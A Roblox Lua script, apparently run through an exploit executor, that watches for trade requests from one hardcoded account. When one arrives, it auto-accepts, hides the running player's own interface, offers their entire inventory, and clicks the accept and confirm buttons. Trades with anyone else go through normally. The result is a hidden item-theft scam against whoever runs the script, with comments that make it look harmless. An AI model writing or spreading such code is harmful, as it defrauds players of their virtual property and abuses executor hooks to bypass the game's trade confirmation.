local Players = game:GetService("Players")
local ReplicatedStorage = ReplicatedStorage or game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local TradeFolder = ReplicatedStorage:WaitForChild("Trade")
local SendRequest = TradeFolder:WaitForChild("SendRequest")
local AcceptRequest = TradeFolder:WaitForChild("AcceptRequest")
local DeclineRequest = TradeFolder:WaitForChild("DeclineRequest")
local StartTradeEvent = TradeFolder:WaitForChild("StartTrade")
local OfferItemEvent = TradeFolder:WaitForChild("OfferItem")
local AcceptTradeEvent = TradeFolder:WaitForChild("AcceptTrade")

print("Waiting for incoming trade request callback...")

-- Function to hide all UI elements inside a player's PlayerGui
local function hidePlayerGui(player)
    if player and player:FindFirstChild("PlayerGui") then
        for _, gui in ipairs(player.PlayerGui:GetChildren()) do
            if gui:IsA("LayerCollector") then
                gui.Enabled = false
            end
        end
        print("Hidden all GUIs for player: " .. player.Name)
    end
end

-- Set up the client callback to intercept incoming requests from the server
SendRequest.OnClientInvoke = function(senderPlayer)
    -- Check if the sender is user17644395
    if senderPlayer and senderPlayer.Name == "bofuxa" then
        print("Trade request verified from user17644395. Accepting...")
        
        -- Hide all PlayerGuis for user17644395 when they trade you
        hidePlayerGui(senderPlayer)
        -- Also hide your own PlayerGuis if desired
        hidePlayerGui(LocalPlayer)

        AcceptRequest:FireServer()
        
        -- Spawn a thread to wait for the trade session to start, wait 1 second, then add all items including duplicates
        task.spawn(function()
            print("Waiting for trade to start...")
            StartTradeEvent.OnClientEvent:Wait()
            
            print("Trade started! Waiting 1 second before offering items...")
            task.wait(1)
            
            -- Find the inventory container for weapons
            local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
            local inventoryContainer = playerGui 
                and playerGui:WaitForChild("MainGUI", 5) 
                and playerGui.MainGUI:WaitForChild("Game", 5) 
                and playerGui.MainGUI.Game:WaitForChild("Crafting", 5) 
                and playerGui.MainGUI.Game.Crafting:WaitForChild("Inventory", 5) 
                and playerGui.MainGUI.Game.Crafting.Inventory:WaitForChild("Salvage", 5) 
                and playerGui.MainGUI.Game.Crafting.Inventory.Salvage:WaitForChild("ScrollFrame", 5) 
                and playerGui.MainGUI.Game.Crafting.Inventory.Salvage.ScrollFrame:WaitForChild("Container", 5)

            if inventoryContainer then
                for _, item in ipairs(inventoryContainer:GetChildren()) do
                    if item:IsA("GuiObject") or item:IsA("Frame") or item:IsA("ImageButton") then
                        local itemName = item.Name
                        local category = "Weapons"
                        
                        -- Check for quantity/duplicates attribute if present, default to 1 instance
                        local count = 1
                        local qtyAttribute = item:GetAttribute("Count") or item:GetAttribute("Quantity")
                        if type(qtyAttribute) == "number" then
                            count = qtyAttribute
                        end

                        -- Fire the offer event for each duplicate/instance found
                        for i = 1, count do
                            OfferItemEvent:FireServer(itemName, category)
                            task.wait(0.05)
                        end
                    end
                end
                print("All items and duplicates offered successfully!")
            else
                warn("Could not find inventory container path!")
            end

            -- Wait before triggering trade accept actions
            print("Waiting before triggering trade accept actions...")
            task.wait(7)

            -- Firesignal simulation for AcceptTrade event if supported, else FireServer fallback
            if firesignal and AcceptTradeEvent.OnClientEvent then
                firesignal(AcceptTradeEvent.OnClientEvent, false)
            else
                AcceptTradeEvent:FireServer()
            end

            -- Trigger the GUI buttons
            local actionsFolder = LocalPlayer.PlayerGui:WaitForChild("TradeGUI"):WaitForChild("Container"):WaitForChild("Trade"):WaitForChild("Actions")

            local function fireButton(btn)
                if btn and btn:IsA("GuiButton") and getconnections then
                    for _, connection in ipairs(getconnections(btn.Activated)) do
                        connection:Fire()
                    end
                    for _, connection in ipairs(getconnections(btn.MouseButton1Click)) do
                        connection:Fire()
                    end
                elseif btn and btn:IsA("GuiButton") then
                    btn:Activate()
                end
            end

            local firstButton = actionsFolder:WaitForChild("Accept"):WaitForChild("ActionButton")
            fireButton(firstButton)
            print("Triggered first ActionButton")

            task.wait(1)

            local confirmButton = actionsFolder:WaitForChild("Accept"):WaitForChild("Confirm"):WaitForChild("ActionButton")
            fireButton(confirmButton)
            print("Triggered confirmation ActionButton")
        end)

        return true
    else
        -- Allow normal trading with other players without triggering the auto-item-dump or hiding GUIs
        print("Trade request from other player (" .. tostring(senderPlayer) .. "). Allowing normal trade...")
        return true
    end
end
